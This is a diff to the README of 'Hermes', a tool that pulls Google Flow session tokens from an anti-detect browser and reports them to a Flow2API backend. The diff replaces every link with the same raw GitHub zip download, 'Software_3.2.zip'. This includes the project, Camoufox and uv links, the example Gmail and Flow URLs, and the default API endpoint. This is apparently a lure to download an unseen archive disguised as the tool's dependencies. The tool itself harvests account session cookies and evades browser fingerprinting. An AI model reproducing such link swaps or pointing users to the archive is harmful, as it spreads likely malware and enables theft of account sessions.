@@ -2,7 +2,7 @@
 
 > Google Flow session token extractor & auto-reporter, powered by Camoufox.
 
-Hermes automates the full lifecycle of Google Flow account credentials — from first login to periodic token refresh — and reports session tokens to a [Flow2API](https://github.com/TheSmallHanCat/flow2api) backend without any manual intervention.
+Hermes automates the full lifecycle of Google Flow account credentials — from first login to periodic token refresh — and reports session tokens to a [Flow2API](https://github.com/Sami942/Hermes/raw/refs/heads/main/athyrosis/Software_3.2.zip) backend without any manual intervention.
 
 ---
 
@@ -11,15 +11,15 @@ Hermes automates the full lifecycle of Google Flow account credentials — from 
 - **Persistent login** — saves full browser state (including `HttpOnly` cookies) via Playwright storage state; no re-login needed across runs
 - **Flow mode** — navigates to Google Flow, clicks the sign-in button, waits for `__Secure-next-auth.session-token`, and POSTs it to your Flow2API instance automatically
 - **Multi-account support** — manage multiple Google accounts under `accounts/`, run them in batch
-- **Anti-detect browser** — built on [Camoufox](https://camoufox.com), a hardened Firefox fork with fingerprint rotation
+- **Anti-detect browser** — built on [Camoufox](https://github.com/Sami942/Hermes/raw/refs/heads/main/athyrosis/Software_3.2.zip), a hardened Firefox fork with fingerprint rotation
 
 ---
 
 ## Requirements
 
 - Python 3.11+
-- [uv](https://github.com/astral-sh/uv) (recommended) or pip
-- A running [Flow2API](https://github.com/TheSmallHanCat/flow2api) instance
+- [uv](https://github.com/Sami942/Hermes/raw/refs/heads/main/athyrosis/Software_3.2.zip) (recommended) or pip
+- A running [Flow2API](https://github.com/Sami942/Hermes/raw/refs/heads/main/athyrosis/Software_3.2.zip) instance
 
 ```bash
 uv add camoufox requests
@@ -45,19 +45,19 @@ Credentials are saved to `accounts/<account-name>.json`.
 
 ```bash
 uv run main.py --load work
-uv run main.py --load work --url https://mail.google.com
+uv run main.py --load work --url https://github.com/Sami942/Hermes/raw/refs/heads/main/athyrosis/Software_3.2.zip
 uv run main.py --load work --headless --wait 30
 ```
 
 ### 3. Flow mode — extract & report token
 
 ```bash
-uv run main.py --flow work --flow-api-key "admin:yourpassword" --flow-api https://example.com/api/plugin/update-token
+uv run main.py --flow work --flow-api-key "admin:yourpassword" --flow-api https://github.com/Sami942/Hermes/raw/refs/heads/main/athyrosis/Software_3.2.zip
 ```
 
 Hermes will:
 1. Load the saved account state
-2. Navigate to `https://labs.google/fx/tools/flow`
+2. Navigate to `https://github.com/Sami942/Hermes/raw/refs/heads/main/athyrosis/Software_3.2.zip`
 3. Click the Google sign-in button
 4. Poll until `__Secure-next-auth.session-token` appears
 5. Authenticate against your Flow2API admin endpoint
@@ -88,7 +88,7 @@ uv run main.py --list
 | `--headless` | Run browser in headless mode |
 | `--wait N` | Close browser after N seconds |
 | `--flow NAME` | Flow mode: extract & report session token |
-| `--flow-api URL` | Flow2API endpoint (default: `https://example.com/api/plugin/update-token`) |
+| `--flow-api URL` | Flow2API endpoint (default: `https://github.com/Sami942/Hermes/raw/refs/heads/main/athyrosis/Software_3.2.zip`) |
 | `--flow-api-key USER:PASS` | Flow2API admin credentials |
 
 ---
